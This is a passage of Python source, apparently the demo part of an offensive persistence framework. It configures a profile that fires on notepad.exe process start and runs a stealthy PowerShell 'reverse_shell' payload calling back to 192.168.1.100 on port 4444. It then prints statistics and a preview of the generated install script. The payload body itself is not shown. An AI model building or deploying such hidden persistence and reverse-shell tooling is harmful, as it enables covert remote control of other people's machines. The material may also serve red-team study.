        trigger_type=TriggerType.PROCESS_START,
        consumer_type=ConsumerType.POWERSHELL,
        payload_template="reverse_shell",
        host="192.168.1.100",
        port=4444,
        process_name="notepad.exe",
        stealth=True
    )
    
    print(f"  ✓ Profile ID: {profile2.profile_id}")
    print(f"  ✓ Triggers on: notepad.exe start")
    
    # Stats
    stats = engine.get_stats()
    print(f"\n📊 Statistics: {stats}")
    
    # Print install script preview
    print("\n📜 Install Script Preview (first 500 chars):")
    print("-" * 40)
    print(profile.install_script[:500] + "...")
